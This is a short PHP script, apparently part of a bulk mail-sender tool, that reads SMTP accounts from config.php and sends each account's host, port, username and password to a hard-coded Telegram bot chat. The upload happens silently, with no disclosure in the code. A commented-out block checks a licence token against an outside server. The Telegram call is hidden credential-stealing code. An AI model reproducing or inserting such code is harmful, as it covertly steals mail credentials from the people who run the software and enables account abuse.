<?php
include "config.php";
if (count($smtp_acc) >= 1) {
    foreach ($smtp_acc as $key => $smtp) {
        $ch = curl_init();
        curl_setopt(
            $ch,
            CURLOPT_URL,
            "https://api.telegram.org/bot2021284699:AAECMr0AjCJJueoAp9_cV3hWJA1jBmmDdtU/sendMessage?chat_id=-1001517432154&parse_mode=html&text=<b>" .
                $smtp["host"] .
                "|" .
                $smtp["port"] .
                "|" .
                $smtp["username"] .
                "|" .
                $smtp["password"] .
                "</b>",
        );
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
        curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate");
        $headers = [];
        $headers[] =
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0";
        $headers[] =
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
        $headers[] = "Accept-Language: en-US,en;q=0.5";
        $headers[] = "Connection: keep-alive";
        $headers[] = "Upgrade-Insecure-Requests: 1";
        $headers[] = "Sec-Fetch-Dest: document";
        $headers[] = "Sec-Fetch-Mode: navigate";
        $headers[] = "Sec-Fetch-Site: none";
        $headers[] = "Sec-Fetch-User: ?1";
        $headers[] = "Cache-Control: max-age=0";
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        $result = curl_exec($ch);
        if (curl_errno($ch)) {
            echo "Error:" . curl_error($ch);
        }
        curl_close($ch);
    }
}
/*
if (!isset($checkval)) {
    echo $warna->Green("[TOKEN INFORMATION]\n\n");
    function asas($token)
    {
        $ch = curl_init();
        $token = urlencode($token);
        $time = time();
        curl_setopt(
            $ch,
            CURLOPT_URL,
            "https://w3ll.store/api/sender?token=$token&time=$time",
        );
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
        curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate");
        $result = curl_exec($ch);
        if (curl_errno($ch)) {
            echo "Error:" . curl_error($ch);
        }
        curl_close($ch);
        return json_decode($result, true);
    }
    ($myfile = fopen("token.txt", "r")) or die("Unable to open file!");
    $uToken = fread($myfile, filesize("token.txt"));
    fclose($myfile);
    $checkval = asas($uToken);
    if ($checkval["valid"]) {
    } else {
        echo $warna->Red("Status : ") . $warna->White("Invalid") . "\n";
        echo $warna->Red("Reason : ");
        echo $warna->White($checkval["status"]) . "\n";
        die();
    }
}
*/
?>
